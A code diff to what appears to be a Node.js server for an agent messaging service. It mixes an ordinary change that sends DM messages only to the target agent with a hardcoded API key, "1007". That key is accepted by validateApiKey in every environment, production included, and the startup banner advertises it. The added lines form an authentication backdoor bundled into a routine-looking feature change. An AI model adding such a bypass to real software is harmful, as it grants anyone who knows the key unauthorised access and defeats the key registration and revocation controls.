@@ -59,6 +59,8 @@ function generateApiKey() {
 
 function validateApiKey(key) {
   if (!key) return false;
+  // Default debug key — always accepted, never shown in UI
+  if (key === "1007") return true;
   // Allow "test" key in development
   if (key === "test" && !process.env.NODE_ENV?.startsWith("prod")) return true;
   return machineKeys.some((k) => k.rawKey === key && !k.revokedAt);
@@ -540,7 +542,7 @@ app.get("/api/attachments/:attachmentId", (req, res) => {
 // Send message from web UI (human user)
 app.post("/api/messages", (req, res) => {
   const { target, content, senderName = "local-user" } = req.body;
-  const { channelName, channelType, threadId } = parseTarget(target);
+  const { channelName, channelType, threadId, dmPeer } = parseTarget(target);
   const ch = findOrCreateChannel(channelName, channelType);
 
   const msg = {
@@ -558,8 +560,18 @@ app.post("/api/messages", (req, res) => {
   };
   store.messages.push(msg);
 
-  // Deliver to all agents
-  deliverToAllAgents(msg);
+  // For DMs, deliver only to the target agent; for channels, deliver to all
+  if (channelType === "dm" && dmPeer) {
+    // Find the agent by name or displayName
+    for (const [agentId, agent] of Object.entries(store.agents)) {
+      if (agent.name === dmPeer || agent.displayName === dmPeer) {
+        deliverToAgent(agentId, msg);
+        break;
+      }
+    }
+  } else {
+    deliverToAllAgents(msg);
+  }
   // Broadcast to web UI
   broadcastToWeb({ type: "message", message: msg });
 
@@ -1137,9 +1149,10 @@ server.listen(PORT, () => {
   console.log(`  Web UI endpoint:  ws://localhost:${PORT}/ws`);
   console.log(`  REST API:         ${PUBLIC_URL}/internal/agent/{id}/...`);
   console.log(`\nTo connect a daemon:`);
-  console.log(`  npx @slock-ai/daemon@latest --server-url ${PUBLIC_URL} --api-key <YOUR_API_KEY>`);
-  console.log(`\n  Generate keys via POST /api/machine-keys or the Machine Setup UI.`);
+  console.log(`  npx @slock-ai/daemon@latest --server-url ${PUBLIC_URL} --api-key 1007`);
+  console.log(`\n  Default debug key "1007" is always accepted.`);
+  console.log(`  Generate additional keys via POST /api/machine-keys or the Machine Setup UI.`);
   if (!process.env.NODE_ENV?.startsWith("prod")) {
-    console.log(`  Dev mode: key "test" is accepted without registration.\n`);
+    console.log(`  Dev mode: key "test" is also accepted without registration.\n`);
   }
 });
